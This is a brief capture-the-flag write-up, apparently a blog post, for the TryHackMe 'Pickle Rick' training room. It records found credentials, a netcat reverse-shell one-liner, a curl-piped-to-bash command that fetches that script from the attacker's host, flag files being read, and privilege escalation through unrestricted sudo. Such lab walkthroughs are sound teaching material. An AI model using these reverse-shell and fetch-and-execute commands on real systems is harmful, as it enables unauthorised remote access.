---
title: Pickle Rick
description: 'Basic web / linux enumeration'
pubDate: 2021-01-01
category: 'tryhackme'
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/47d2d3ade1795f81a155d0aca6e4da96.jpeg'
---

## Webpage source
    Username: R1ckRul3s

Robots.txt:
    Wubbalubbadubdub

## SHELL

shell.sh:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.31.119 4444 >/tmp/f
```

Executing the shell:
```bash
curl 10.9.31.119:8000/shell.sh | bash
```

```bash
www-data@ip-10-10-70-96:/var/www/html$ cat Sup3rS3cretPickl3Ingred.txt
cat Sup3rS3cretPickl3Ingred.txt
mr. meeseek hair
```

second ingredients

```bash
www-data@ip-10-10-70-96:/home/rick$ cat *
```
www-data has all sudo rights?

```bash
User www-data may run the following commands on ip-10-10-70-96.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```

```bash
sudo cat /root/3rd.txt
3rd ingredients: fleeb juice
```

## ROOT

```bash
sudo bash -p
```
